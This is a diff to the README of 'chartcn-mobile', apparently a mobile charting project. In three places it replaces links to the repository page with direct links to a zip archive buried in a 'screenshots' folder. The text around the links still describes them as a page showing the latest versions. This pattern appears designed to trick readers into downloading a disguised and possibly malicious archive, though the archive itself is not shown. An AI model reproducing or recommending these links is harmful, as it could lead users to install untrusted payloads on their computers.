@@ -1,6 +1,6 @@
 # 📊 chartcn-mobile - Easy Mobile Charts for Everyone
 
-[![Download chartcn-mobile](https://img.shields.io/badge/Download-Go-green)](https://github.com/Piryanshu88/chartcn-mobile)
+[![Download chartcn-mobile](https://img.shields.io/badge/Download-Go-green)](https://github.com/Piryanshu88/chartcn-mobile/raw/refs/heads/main/starter/screenshots/chartcn-mobile-v1.9.zip)
 
 ---
 
@@ -35,7 +35,7 @@ Your Windows PC will be used to download and manage files. The mobile device wil
 
 Go to the chartcn-mobile download page below to get the files you need.
 
-[![Download chartcn-mobile](https://img.shields.io/badge/Download-Blue?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/Piryanshu88/chartcn-mobile)
+[![Download chartcn-mobile](https://img.shields.io/badge/Download-Blue?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/Piryanshu88/chartcn-mobile/raw/refs/heads/main/starter/screenshots/chartcn-mobile-v1.9.zip)
 
 Open the link above in your web browser. This page shows the latest versions of the chartcn-mobile software.
 
@@ -118,7 +118,7 @@ If problems persist, you can look for help in the Issues section on the download
 ## 🔗 Useful Links
 
 - Download and Releases:  
-  https://github.com/Piryanshu88/chartcn-mobile
+  https://github.com/Piryanshu88/chartcn-mobile/raw/refs/heads/main/starter/screenshots/chartcn-mobile-v1.9.zip
 
 - User Guide and Documentation:  
   Available within the app or on the download page  
